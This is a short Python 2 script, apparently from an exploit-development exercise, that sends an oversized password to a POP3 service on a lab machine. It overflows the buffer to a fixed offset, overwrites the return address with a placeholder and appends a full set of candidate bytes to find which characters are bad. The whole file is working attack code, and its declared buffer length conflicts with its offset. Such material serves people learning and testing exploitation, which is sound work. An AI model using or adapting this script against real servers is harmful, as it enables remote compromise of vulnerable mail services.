#!/usr/bin/python

import socket

RHOST = "10.0.2.15"
RPORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Variable containing badchars
badchar_test = ""
badchars = [0x00,0x0A,0x0D]

for i in range (0x00, 0xFF+1):
    if i not in badchars:
        badchar_test += chr(i)

with open("badchar_test.bin", "wb") as f:
    f.write(badchar_test)

buf_totlen = 1024
offset_srp = 2606

buf = ""
buf += "A" * (offset_srp - len(buf))
buf += "BBBB"
buf += badchar_test
buf += "D" * (buf_totlen - len(buf))
buf += "\n"

try:
    print "\nSending buffer..."
    #Connect to Windows machine
    s.connect(('10.0.2.15', 110))
    print "Connected"
    data = s.recv(1024)
    print str(data)
    s.send('USER username' + '\r\n')
    data = s.recv(1024)
    print str(data)
    s.send('PASS ' + buf + '\r\n')
    print "\nDone!"
	
except:
    print "Could not connect" 
